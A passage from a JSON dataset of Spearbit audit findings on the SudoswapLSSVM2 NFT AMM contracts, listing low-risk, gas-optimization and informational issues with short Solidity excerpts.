getPrevFeeRe- cipientForPair() will return 0. The obsolete Splitter will however remain present, but any ETH or tokens that are sent to the contract can't be completely retrieved via withdrawETH() and withdrawTokens(). This is because getPrevFeeRecipientForPair() is 0 and the tokens would be send to address(0). It is unlikely though that ETH or tokens are sent to the Splitter contract as it is not used anymore. function withdrawETH(uint256 ethAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... payable(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter())).safeTransferETH(... ); ,! } function withdrawTokens(ERC20 token, uint256 tokenAmount) public { ISettings parentSettings = ISettings(getParentSettings()); ... token.safeTransfer(parentSettings.getPrevFeeRecipientForPair(getPairAddressForSplitter()), ... ); c } function getPrevFeeRecipientForPair(address pairAddress) public view returns (address) { return pairInfos[pairAddress].prevFeeRecipient; } function reclaimPair(address pairAddress) public { ... delete pairInfos[pairAddress]; ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Divisions in getBuyInfo() and getSellInfo() may be rounded down to 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In extreme cases (e.g. tokens with a few decimals, see this example), divisions in getBuyInfo() and getSellInfo() may be rounded down to 0. This means inputValueWithoutFee and/or outputValueWithoutFee may be 0. function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... } function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 outputValueWithoutFee = (numItems * tokenBalance) / (nftBalance + numItems); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Last NFT in an XykCurve cannot be sold", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getBuyInfo() of XykCurve enforces numItems < nftBalance, which means the last NFT can never be sold. One potential solution as suggested by the Sudoswap team is to set delta (=nftBalance) one higher than the real amount of NFTs. This could cause problems in other parts of the code. For example, once only one NFT is left, if we try to use changeSpotPriceAndDelta(), getBuyNFTQuote(1) will error and thus the prices (tokenBalance) and delta (nftBalance) can't be changed anymore. If nftBalance is set to one higher, then it won't satisfy pair.nft().balanceOf(pairAddress) >= 1. 31 contract XykCurve ... { function getBuyInfo(..., uint256 numItems, ... ) ... { ... uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // If numItems is too large, we will get divide by zero error if (numItems >= nftBalance) { return (Error.INVALID_NUMITEMS, 0, 0, 0, 0, 0); } ... } } function changeSpotPriceAndDelta(...) ... { ... (,,, uint256 priceToBuyFromPair,) = pair.getBuyNFTQuote(1); ... if (... && pair.nft().balanceOf(pairAddress) >= 1) { pair.changeSpotPrice(newSpotPrice); pair.changeDelta(newDelta); return; } ... } function getBuyNFTQuote(uint256 numNFTs) ... { (error, ...) = bondingCurve().getBuyInfo(..., numNFTs, ...); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Allowing different ERC20 tokens in LSSVMRouter swaps will affect accounting and lead to unde- fined behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "As commented \"Note: All ERC20 swaps assume that a single ERC20 token is used for all the pairs involved. * Swapping using multiple tokens in the same transaction is possible, but the slippage checks * & the return values will be meaningless and may lead to undefined behavior.\" This assumption may be risky if users end up mistakenly using different ERC20 tokens in different swaps. Summing up their inputAmount and remainingValue will not be meaningful and lead to accounting errors and undefined behavior (as noted).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing array length equality checks may lead to incorrect or undefined behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions taking two array type parameters and not checking that their lengths are equal may lead to incorrect or undefined behavior when accidentally passing arrays of unequal lengths.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Owners may have funds locked if newOwner is EOA in transferOwnership()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In transferOwnership(), if newOwner has zero code.length (i.e. EOA), newOwner.isContract() will be false and therefore, if block will be ignored. As the function is payable, any msg.value from the call would get locked in the contract. Note: ERC20 pairs and StandardSettings don't have a method to recover ETH.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Use of transferFrom may lead to NFTs getting locked forever", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "ERC721 NFTs may get locked forever if the recipient is not aware of ERC721 for some reason. While safeTransferFrom() is used for ERC1155 NFTs (which has the _doSafeTransferAcceptanceCheck check on recipient and does not have an option to avoid this), transferFrom() is used for ERC721 NFTs presumably for gas savings and reentrancy concerns over its safeTransferFrom variant (which has the _checkOnERC721Received check on the recipient).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Single-step ownership change introduces risks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Single-step ownership transfers add the risk of setting an unwanted owner by accident (this includes address(0)) if the ownership transfer is not done with excessive care. The ownership control library Owned by Solmate implements a simple single-step ownership transfer without zero-address checks.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "getAllPairsForSettings() may run out of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function getAllPairsForSettings() has a loop over pairsForSettings. As the creation of pairs is permissionless, that array could get arbitrarily large. Once the array is large enough, the function will run out of gas. Note: the function is only called from the outside. function getAllPairsForSettings(address settings) external view returns (address[] memory) { uint256 numPairs = pairsForSettings[settings].length(); ... for (uint256 i; i < numPairs;) { ... unchecked { ++i; } } ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Partially implemented SellOrderWithPartialFill functionality may cause unexpected behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "pair.spotPrice() == order.expectedSpotPrice in a swap. This may be confusing to users who expect partial fills in both directions but notice unexpected behavior if deployed as-is. While the BuyOrderWithPartialFill functionality is fully implemented, the corresponding SellOrderWithPartialFill feature is partially implemented with getNFTQuoteForSellOrderWithPartialFill, an incomplete _findMaxFillableAmtForSell (placeholder comment: \"// TODO: implement\") and other supporting logic required in swap().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Lack of deadline checks for certain swap functions allows greater exposure to volatile market prices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Many swap functions in LSSVMRouter use the checkDeadline modifier to prevent swaps from execut- ing beyond a certain user-specified deadline. This is presumably to reduce exposure to volatile market prices on top of the thresholds of maxCost for buys and minOutput for sells. However two router functions robustSwapETH- ForSpecificNFTsAndNFTsToToken and robustSwapERC20ForSpecificNFTsAndNFTsToToken in LSSVMRouter and all functions in VeryFastRouter are missing this modifier and the user parameter required for it. Users attempting to swap using these two swap functions do not have a way to specify a deadline for their execution unlike the other swap functions in this router. If the front-end does not highlight or warn about this, then the user swaps may get executed after a long time depending on the tip included in the transaction and the network congestion. This causes greater exposure for the swaps to volatile market prices.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing function to deposit ERC1155 NFTs after pair creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() are apparently used to deposit ERC721 NFTs and ERC20s into appropriate pairs after their creation. According to the project team, this is used \"for various UIs to consolidate approvals + emit a canonical event for deposits.\" However, an equivalent function for depositing ERC1155 NFTs is missing. This prevents ERC1155 NFTs from being deposited into pairs after creation for scenarios anticipated similar to ERC721 NFTs and ERC20 tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Reading from state is more gas expensive than using msg.sender", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Solmate's Owned.sol contract implements the concept of ownership (by saving during contract con- struction the deployer in the owner state variable) and owner-exclusive functions via the onlyOwner() modifier. Therefore, within functions protected by the onlyOwner() modifier, the addresses stored in msg.sender and owner will be equal. So, if a function of said characteristics has to make use of the address of the owner, it is cheaper to use msg.sender than owner, because the latter reads from the contract state (using SLOAD opcode) while the former doesn't (address is directly retrieved via the cheaper CALLER opcode). Reading from state (SLOAD opcode which costs either 100 or 2100 gas units) costs more gas than using the msg.sender environmental variable (CALLER opcode which costs 2 units of gas). Note: withdrawERC20() already uses msg.sender function withdrawETH(uint256 amount) public onlyOwner { payable(owner()).safeTransferETH(amount); ... } function withdrawERC20(ERC20 a, uint256 amount) external override onlyOwner { a.safeTransfer(msg.sender, amount); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "pair.factory().protocolFeeMultiplier() is read from storage on every iteration of the loop wast- ing gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Not caching storage variables that are accessed multiple times within a loop causes waste of gas. If not cached, the solidity compiler will always read the value of protocolFeeMultiplier from storage during each iteration. For a storage variable, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory variable, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "The use of factory in ERC1155._takeNFTsFromSender() can be via a parameter rather than calling factory() again", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "factory is being sent as a parameter to _takeNFTsFromSender in LSSVMPairERC721.sol#L179, which is saving gas because it is not required to read the value again. _takeNFTsFromSender(IERC721(nft()), nftIds, _factory, isRouter, routerCaller); However, in LSSVMPairERC1155.sol#L181, the similar function _takeNFTsFromSender() gets the value by calling factory() instead of using a parameter. _takeNFTsFromSender(IERC1155(nft()), numNFTs[0], isRouter, routerCaller); This creates an unnecessary asymmetry between the two contracts which are expected to be similar and also a possible gas optimization by avoiding a call to the factory getter.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Variables only set at construction time could be made immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "immutable variables can be assigned either at construction time or at declaration time, and only once. The contract creation code generated by the compiler will modify the contracts runtime code before it is returned by replacing all references to immutable variables by the values assigned to the them; so the compiler does not reserve a storage slot for these variables. Declaring variables only set at construction time as immutable results in saving one call per variable to SSTORE (0x55) opcode, thus saving gas during construction.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Hoisting check out of loop will save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The check numIdsFound == maxIdsNeeded will never be true before the outer for loop finishes iterating over maxIdsNeeded because numIdsFound is conditionally incremented only by 1 in each iteration.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Functionality of safeBatchTransferFrom() is not used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function pairTransferERC1155From() allow that transfer of multiple id's of ERC1155 NFTs. The rest of the code only uses one id at a time. Using safeTransferFrom() instead of safeBatchTransferFrom(), might be better as it only accesses one id and uses less gas because no for loop is necessary. However future version of Sudoswap might support multiple ids. In that case its better to leave as is. function pairTransferERC1155From(..., uint256[] calldata ids, uint256[] calldata amounts,...) ... { ... nft.safeBatchTransferFrom(from, to, ids, amounts, bytes(\"\")); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Using != 0 instead of > 0 can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "When dealing with unsigned integer types, comparisons with != 0 are 3 gas cheaper than > 0.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Using >>1 instead of /2 can save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A division by 2 can be calculated by shifting one to the right (>>1). While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Retrieval of ether balance of contract can be gas optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The retrieval of the ether balance of a contract is typically done with address(this).balance. However, by using an assembly block and the selfbalance() instruction, one can get the balance with a discount of 15 units of gas.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Function parameters should be validated at the very beginning for gas optimizations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Function parameters should be validated at the very beginning of the function to allow typical execu- tion paths and revert on the exceptional paths, which will lead to gas savings over validating later.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Loop counters are not gas optimized in some places", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Loop counters are optimized in many parts of the code by using an unchecked {++i} (unchecked + prefix increment). However, this is not done in some places where it is safe to do so.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization MerklePropertyChecker.sol#L22,"]}, {"title": "Mixed use of custom errors and revert strings is inconsistent and uses extra gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In some parts of the code, custom errors are declared and later used (CurveErrorCodes and Own- able Errors), while in other parts, classic revert strings are used in require statements. Instead of using error strings, custom errors can be used, which would reduce deployment and runtime costs. Using only custom errors would improve consistency and gas cost. This would also avoid long revert strings which consume extra gas. Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas. This happens at LSSVMPair.sol#L133, LSSVMPair.sol#L666 and LSSVMPairFactory.sol#L505.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Array length read in each iteration of the loop wastes gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If not cached, the Solidity compiler will always read the length of the array from storage during each iteration. For storage array, this implies extra SLOAD operations (100 additional gas for each iteration beyond the first). In contrast, for a memory array, it implies extra MLOAD operations (3 additional gas for each iteration beyond the first).", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization LSSVMPairERC1155.sol, LSSVMPairETH.sol, LSSVMPairERC721.sol,"]}, {"title": "Not tightly packing struct variables consumes extra storage slots and gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Gas efficiency can be achieved by tightly packing structs. Struct variables are stored in 32 bytes each and so you can group smaller types to occupy less storage.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Variables that are redeclared in each loop iteration can be declared once outside the loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "price is redefined in each iteration of the loop and right after declaration is set to a new value. for (uint256 i; i < numNFTs; i++) { uint256 price; (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, pair.factory().protocolFeeMultiplier()); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Gas Optimization"]}, {"title": "Caller of swapTokenForSpecificNFTs() must be able to receive ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _refundTokenToSender() sends ETH back to the caller. If this caller is a contract then it might not be able to receive ETH. If it can't receive ETH then the transaction will revert. function _refundTokenToSender(uint256 inputAmount) internal override { // Give excess ETH back to caller if (msg.value > inputAmount) { payable(msg.sender).safeTransferETH(msg.value - inputAmount); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "order.doPropertyCheck could be replaced by the pair's propertyChecker()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The field+check for a separate order.doPropertyCheck in struct SellOrder is unnecessary be- cause this can already be checked via the pair's propertyChecker() without relying on the user to explicitly specify it in their order.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "_payProtocolFeeFromPair() could be replaced with _sendTokenOutput()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Both ERC20 and ETH versions of _payProtocolFeeFromPair() and _sendTokenOutput() are iden- tical in their parameters and logic.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "False positive in test_getSellInfoWithoutFee() when delta == FixedPointMathLib.WAD due to wrong implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "In test_getSellInfoWithoutFee, delta is not validated via validateDelta, which causes a false positive in the current test when delta == FixedPointMathLib.WAD. This can be tried with the following proof of concept // SPDX-License-Identifier: MIT pragma solidity ^0.8.15; import {FixedPointMathLib} from ,! \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/FixedPointMathLib.sol\"; contract test{ using FixedPointMathLib for uint256; constructor() { uint256 delta = FixedPointMathLib.WAD; uint256 invDelta = FixedPointMathLib.WAD.divWadDown(delta); uint outputValue = delta.divWadDown(FixedPointMathLib.WAD - invDelta); // revert } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Checks-Effects-Interactions pattern not used in swapNFTsForToken()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "It is a defensive programming pattern to first take NFTs and then send the tokens (i.e. the Checks- Effects-Interactions pattern). function swapNFTsForToken(...) ... { ... _sendTokenOutput(tokenRecipient, outputAmount); ... _sendTokenOutput(royaltyRecipients[i], royaltyAmounts[i]); ... _payProtocolFeeFromPair(_factory, protocolFee); ... _takeNFTsFromSender(...); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two versions of withdrawERC721() and withdrawERC1155()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "withdrawERC721() and withdrawERC1155() with slightly different implementations. This is more difficult to maintain.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing sanity/threshold checks may cause undesirable behavior and/or waste of gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Numerical user inputs and external call returns that are subject to thresholds due to the contract's logic should be checked for sanity to avoid undesirable behavior or reverts in later logic and wasting unnecessary gas in the process.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Deviation from standard/uniform naming convention affects readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Following standard/uniform naming conventions are essential to make a codebase easy to read and understand.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational LSSVMPairFactory.sol#L471, LSSVMRouter.sol#L128-L135,"]}, {"title": "Function _getRoyaltyAndSpec() contains code duplication which affects maintainability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _getRoyaltyAndSpec() is rather long and contains code duplication. This makes it difficult to maintain. 45 function _getRoyaltyAndSpec(address tokenAddress, uint256 tokenId, uint256 value) ... if (spec <= NOT_CONFIGURED && spec > NONE) { try IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId) returns (...) { // Support Art Blocks override require(recipients_.length == bps.length); return (recipients_, _computeAmounts(value, bps), ARTBLOCKS, royaltyAddress, addToCache); } catch {} ... } else { // Spec exists, just execute the appropriate one ... ... if (spec == ARTBLOCKS) { // Art Blocks spec uint256[] memory bps; (recipients, bps) = IArtBlocksOverride(royaltyAddress).getRoyalties(tokenAddress, tokenId); require(recipients.length == bps.length); return (recipients, _computeAmounts(value, bps), spec, royaltyAddress, addToCache); } else ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "getSellInfo always adds 1 rather than rounding which leads to last item being sold at 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Based on the comment // We calculate how many items we can sell into the linear curve until the spot price reaches 0, rounding up. In cases where delta == spotPrice && numItems > 1, the last item would be sold at 0: delta = 100; spotPrice = 100; numItems = 2; uint256 totalPriceDecrease = delta * numItems = 200; Therefore succeeds at: if (spotPrice < totalPriceDecrease) Later calculated: uint256 numItemsTillZeroPrice = spotPrice / delta + 1; That would result in 2, while the division was an exact 1, therefore is not rounded up in case where spotPrice == delta but increased always by 1.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Natspec for robustSwapETHForSpecificNFTs() is slightly misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function robustSwapETHForSpecificNFTs() has this comment: * @dev We assume msg.value >= sum of values in maxCostPerPair This doesn't have to be the case. The transaction just reverts if msg.value isn't sufficient.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two copies of pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From() are present", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Both contracts LSSVMRouter and VeryFastRouter contain the functions pairTransferERC20From(), pairTransferNFTFrom() and pairTransferERC1155From(). This is more difficult to maintain as both copies have to stay in synch.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Not using error strings in require statements obfuscates monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "require statements should include meaningful error messages to help with monitoring the system.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "prices and balances in the curves may not be updated after calls to depositNFTs() and depositERC20()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions depositNFTs() and depositERC20() allow anyone to add NFTs and/or ERC20 to a pair but do not update the prices and balances in the curves. And if they were to do so, then the functions might be abused to update token prices with irrelevant tokens and NFTs. However, it is not clear if/how the prices and balances in the curves are updated to reflect this. The owner can't fully rely on emits.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions enableSettingsForPair() and disableSettingsForPair() can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions enableSettingsForPair() and disableSettingsForPair() define a temporary vari- able pair. This could also be used earlier in the code to simplify the code. function enableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); LSSVMPair pair = LSSVMPair(pairAddress); ... } function disableSettingsForPair(address settings, address pairAddress) public { require(isPair(pairAddress, LSSVMPair(pairAddress).pairVariant()), \"Invalid pair address\"); ... LSSVMPair pair = LSSVMPair(pairAddress); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Design asymmetry decreases code readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function _calculateBuyInfoAndUpdatePoolParams() performs a check on maxExpectedToken- Input inside its function. On the other hand, the comparable check for _calculateSellInfoAndUpdatePoolParams() is done outside of the function: function _swapNFTsForToken(...) ... { // LSSVMPairERC721.sol ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(...) require(outputAmount >= minExpectedTokenOutput, \"Out too few tokens\"); ... } The asymmetry in the design of these functions affects code readability and may confuse the reader.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Providing the same _nftID multiple times will increase numPairNFTsWithdrawn multiple times to potentially cause confusion", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If one accidentally (or intentionally) supplies the same id == _nftID multiple times in the array ids[], then numPairNFTsWithdrawn is increased multiple times. Assuming this value is used via indexing for the user interface, this could be misleading.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Dual interface NFTs may cause unexpected behavior if not considered in future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Some NFTs support both the ERC721 and the ERC1155 standard. For example NFTs of the Sandbox project. Additionally, the internal layout of the parameters of cloneETHPair and cloneERC1155ETHPair are very similar: | cloneETHPair | cloneERC1155ETHPair | | --- | --- | | mstore(add(ptr, 0x3e), shl(0x60, factory)) | mstore(add(ptr, 0x3e), shl(0x60, factory)) | | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) | | mstore(add(ptr, 0x66), shl(0x60, nft)) | mstore(add(ptr, 0x66), shl(0x60, nft)) | | mstore8(add(ptr, 0x7a), poolType) | mstore8(add(ptr, 0x7a), poolType) | | mstore(add(ptr, 0x7b), shl(0x60, propertyChecker)) | mstore(add(ptr, 0x7b), nftId) | In case there is a specific function that only works on ERC721, and that can be applied to ERC1155 pairs, in combination with an NFT that supports both standards, then an unexpected situation could occur. Currently, this is not the case, but that might occur in future iterations of the code.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Missing event emission in multicall", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Not emitting events on success/failure of calls within a multicall makes debugging failed multicalls difficult. There are several actions that should always emit events for transparency such as ownership change, transfer of ether/tokens etc. In the case of a multicall function, it is recommended to emit an event for succeeding (or failing) calls.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Returning only one type of fee from getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuote- WithRoyalties() could be misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() re- turn a protocolFee variable. There are also other fees like tradeFee and royaltyTotal that are not returned from these functions. Given that these functions might be called from the outside, it is not clear why other fees are not included here.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Two ways to query the assetRecipient could be confusing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The contract LSSVMPair has two ways to query the assetRecipient. On via the getter assetRecip- ient() and one via getAssetRecipient(). Both give different results and generally getAssetRecipient() should be used. Having two ways could be confusing. address payable public assetRecipient; function getAssetRecipient() public view returns (address payable _assetRecipient) { ... // logic to determine _assetRecipient }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions expecting NFT deposits can validate parameters for sanity and optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions expecting NFT deposits in their typical flows can validate parameters for sanity and opti- mization.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Functions expecting ETH deposits can check msg.value for sanity and optimization", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions that expect ETH deposits in their typical flows can check for non-zero values of msg.value for sanity and optimization.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "LSSVMPairs can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "At the different LSSVMPairs, PairVariant and IMMUTABLE_PARAMS_LENGTH can be passed to LSSVM- Pair, which could store them as immutable. Then functions pairVariant() and _immutableParamsLength() can also be moved to LSSVMPair, which would simplify the code.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Informational"]}, {"title": "Unused values in catch can be avoided for better readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Employing a catch clause with higher verbosity may reduce readability. Solidity supports different kinds of catch blocks depending on the type of 